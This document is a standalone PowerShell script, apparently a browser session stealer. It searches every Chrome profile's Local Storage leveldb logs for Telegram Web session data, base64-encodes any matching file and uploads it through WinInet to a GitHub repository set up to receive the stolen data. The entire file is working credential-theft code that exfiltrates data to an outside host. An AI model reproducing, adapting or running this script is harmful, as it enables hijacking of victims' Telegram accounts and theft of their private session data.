


Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class WinInet {
    [DllImport("wininet.dll", SetLastError = true)]
    public static extern IntPtr InternetOpen(string lpszAgent, uint dwAccessType, string lpszProxyName, string lpszProxyBypass, uint dwFlags);

    [DllImport("wininet.dll", SetLastError = true)]
    public static extern IntPtr InternetConnect(IntPtr hInternet, string lpszServerName, int nServerPort, string lpszUsername, string lpszPassword, uint dwService, uint dwFlags, uint dwContext);

    [DllImport("wininet.dll", SetLastError = true)]
    public static extern IntPtr HttpOpenRequest(IntPtr hConnect, string lpszVerb, string lpszObjectName, string lpszVersion, string lpszReferer, string[] lplpszAcceptTypes, uint dwFlags, uint dwContext);

    [DllImport("wininet.dll", SetLastError = true)]
    public static extern bool HttpSendRequest(IntPtr hRequest, string lpszHeaders, int dwHeadersLength, byte[] lpOptional, int dwOptionalLength);

    [DllImport("wininet.dll", SetLastError = true)]
    public static extern bool InternetCloseHandle(IntPtr hInternet);

    [DllImport("wininet.dll", SetLastError = true)]
    public static extern bool InternetReadFile(IntPtr hFile, byte[] lpBuffer, int dwNumberOfBytesToRead, out int lpdwNumberOfBytesRead);

    public const uint INTERNET_OPEN_TYPE_DIRECT = 1;
    public const uint INTERNET_SERVICE_HTTP = 3;
    public const uint INTERNET_FLAG_RELOAD = 0x80000000;
    public const uint INTERNET_FLAG_SECURE = 0x00800000;
    public const int INTERNET_DEFAULT_HTTPS_PORT = 443;
}
"@

function Invoke-GitHubWinInetUpload {
    param(
        [string]$Uri,
        [string]$Token,
        [string]$JsonBody
    )
    
    $uriObj = [Uri]$Uri
    $isHttps = $uriObj.Scheme -eq "https"
    
    
    $hInternet = [WinInet]::InternetOpen("PowerShellGitHubUploader", [WinInet]::INTERNET_OPEN_TYPE_DIRECT, $null, $null, 0)

    if ($hInternet -eq [IntPtr]::Zero) {
        return $null
    }

    
    $port = if ($isHttps) { [WinInet]::INTERNET_DEFAULT_HTTPS_PORT } else { 80 }
    $flags = if ($isHttps) { [WinInet]::INTERNET_FLAG_SECURE } else { 0 }
    
    $hConnect = [WinInet]::InternetConnect($hInternet, $uriObj.Host, $port, $null, $null, [WinInet]::INTERNET_SERVICE_HTTP, $flags, 0)

    if ($hConnect -eq [IntPtr]::Zero) {

        [WinInet]::InternetCloseHandle($hInternet)
        return $null
    }

    
    $requestFlags = [WinInet]::INTERNET_FLAG_RELOAD -bor $flags
    $hRequest = [WinInet]::HttpOpenRequest($hConnect, "PUT", $uriObj.PathAndQuery, "HTTP/1.1", $null, $null, $requestFlags, 0)

    if ($hRequest -eq [IntPtr]::Zero) {

        [WinInet]::InternetCloseHandle($hConnect)
        [WinInet]::InternetCloseHandle($hInternet)
        return $null
    }

   
    $headers = @(
        "Authorization: token $Token",
        "Accept: application/vnd.github.v3+json",
        "User-Agent: PowerShellWinInet",
        "Content-Type: application/json"
    ) -join "`r`n"

    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($JsonBody)

    
    $success = [WinInet]::HttpSendRequest($hRequest, $headers, $headers.Length, $bodyBytes, $bodyBytes.Length)
    
    $responseContent = $null

    if ($success) {
        
        $buffer = New-Object byte[] 4096
        $responseBuilder = New-Object System.Text.StringBuilder
        $bytesRead = 0
        
        do {
            $readSuccess = [WinInet]::InternetReadFile($hRequest, $buffer, 4096, [ref]$bytesRead)
            if ($bytesRead -gt 0) {
                $responseBuilder.Append([System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)) | Out-Null
            }
        } while ($bytesRead -gt 0)
        
        
    }
    else {

    }

    
    [WinInet]::InternetCloseHandle($hRequest)
    [WinInet]::InternetCloseHandle($hConnect)
    [WinInet]::InternetCloseHandle($hInternet)

    
}

$user = $env:USERNAME
$chromePath = "C:\Users\" + $user + "\AppData\Local\Google\Chrome\User Data"
$num = 0
$token = "YOUR GITHUB API KEY"
$owner = "YOUR GITHUB USERNAME"
$repo = "YOUR GITHUB REPO NAME"
$branch = "YOUR GITHUB BRANCH NAME" 

if (-not (Test-Path $chromePath)) {
    exit 1
}

$profiles = Get-ChildItem -Path $chromePath -Directory

$localStoragePaths = $profiles | Where-Object {

    $localStoragePath = Join-Path $_.FullName "Local Storage\leveldb"
    Test-Path $localStoragePath -PathType Container
} | ForEach-Object {
    Join-Path $_.FullName "Local Storage\leveldb"
}


$allLogFiles = @()

foreach ($path in $localStoragePaths) {

    Write-Host "Checking path: $path" 
    
    $logFiles = Get-ChildItem -Path $path -File | Where-Object {
        $_.Extension -eq ".log"
    } | Select-Object -ExpandProperty FullName
    
    if ($logFiles) {

        $allLogFiles += $logFiles
    }
}



foreach ($log in $allLogFiles) {

    if (Test-Path $log) {

        $fileName = "websession"+$allLogFiles.IndexOf($log).ToString()
        $uri = "https://api.github.com/repos/$owner/$repo/contents/$fileName"
        
        
            
        $content = Get-Content -Path $log -Raw
        $check1 = "https://web.telegram.org"
        $check2 = "dc"
        
        
        if ($content -match $check1 -or $content -match $check2) {

            $base64Content = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
            $body = @{
                message = "Add file via PowerShell WinINet"
                content = $base64Content
                branch = $branch
            }

            $jsonBody = $body | ConvertTo-Json -Depth 10

            Invoke-GitHubWinInetUpload -Uri $uri -Token $token -JsonBody $jsonBody
            break
           
        } else {
            
        } 
      
        
    } else {
        
    }
    
}
